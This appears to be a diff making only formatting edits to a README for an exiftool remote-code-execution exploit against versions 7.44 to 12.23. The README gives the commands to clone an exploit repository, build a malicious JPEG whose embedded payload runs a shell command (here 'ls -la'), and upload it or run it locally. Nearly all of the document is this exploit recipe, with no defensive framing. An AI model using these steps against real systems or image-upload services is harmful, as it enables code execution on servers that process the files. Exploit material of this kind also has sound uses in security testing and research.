@@ -29,10 +29,13 @@ The exiftool version should be between  7.44 to 12.23. </br>
 *COMMAND (exploit)* 
 
 `git clone https://github.com/OneSecCyber/JPEG_RCE.git`
-</br> ''
+</br> 
 </br> `cd JPEG_RCE`
 </br>
-</br> `exiftool -config eval.config runme.jpg -eval='system("ls -la")'`</br>
+</br> `exiftool -config eval.config runme.jpg -eval='system("ls -la")'`
+</br>
 It will create malicious jpg file </br>
-Upload the file or run the file in you local system to see the magic.. </br>
+Upload the file or run the file in you local system to see the magic.. 
+</br>
 `exiftool runme.jpg `
+</br>
